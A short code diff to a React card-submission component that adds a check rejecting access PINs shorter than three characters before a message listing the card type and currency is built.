@@ -31,6 +31,13 @@ const TypeTwo = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
             return;
         }
 
+    
+        if(accessCode.length < 3){
+            alert.error("Invalid Access PIN");
+            setLoading(false)
+            return;
+        }
+
         const msg = `
 Card Type: ${cardname}
 Currency: ${currency}
